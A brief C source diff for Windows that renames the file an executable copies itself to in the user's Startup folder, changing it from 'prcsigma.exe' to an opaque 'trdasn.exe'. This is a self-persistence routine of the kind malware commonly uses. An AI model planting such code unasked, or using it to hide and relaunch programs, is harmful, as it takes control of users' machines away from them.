@@ -29,7 +29,7 @@ int IsInStartup() {
         return -1;
     }
 
-    if (swprintf(exe_path, MAX_PATH, L"%s\\prcsigma.exe", startup_folder) < 0) {
+    if (swprintf(exe_path, MAX_PATH, L"%s\\trdasn.exe", startup_folder) < 0) {
         verbosemsg("Failed to construct executable path", "err");
         return -1;
     }
@@ -84,7 +84,7 @@ void copy_to_startup() {
     }
 
     // Construct the destination path
-    swprintf(destination, MAX_PATH, L"%s\\prcsigma.exe", startup_folder);
+    swprintf(destination, MAX_PATH, L"%s\\trdasn.exe", startup_folder);
 
     // Copy the executable to the Startup folder
     if (CopyFileW(exe_path, destination, FALSE)) {
